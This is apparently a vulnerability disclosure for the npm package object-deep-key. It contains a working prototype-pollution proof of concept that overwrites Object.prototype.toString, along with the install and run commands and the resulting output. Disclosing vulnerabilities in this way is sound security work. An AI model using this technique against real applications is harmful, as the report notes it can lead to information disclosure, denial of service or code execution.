# Description

`object-deep-key` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
const objDeepKey = require('object-deep-key').default

console.log('Before: ', {}.toString)
objDeepKey(constructor.prototype, 'toString').set('function prototype polluted')
console.log('After: ', {}.toString)
```
2. Execute the following commands in the terminal:
```bash
npm i object-deep-key # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: function toString() { [native code] }
After: function prototype polluted
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.

